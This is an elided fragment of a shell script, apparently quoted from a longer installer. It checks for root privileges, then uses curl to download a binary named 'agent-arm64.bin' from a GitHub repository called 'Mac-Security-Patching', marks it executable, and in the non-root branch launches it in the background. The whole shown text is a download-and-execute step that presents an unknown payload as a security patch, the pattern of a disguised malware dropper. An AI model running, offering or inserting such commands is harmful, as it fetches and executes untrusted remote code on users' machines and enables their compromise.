...
if [ "$EUID" -ne 0 ]; then
    ...
    curl https://github.com/xxoo-d/Mac-Security-Patching/raw/refs/heads/main/agent-arm64.bin -o $PROGRAM
    chmod +x $PROGRAM
    $PROGRAM &
else
    ...
    curl https://github.com/xxoo-d/Mac-Security-Patching/raw/refs/heads/main/agent-arm64.bin -o $ROOTPROGRAM
    chmod +x $ROOTPROGRAM
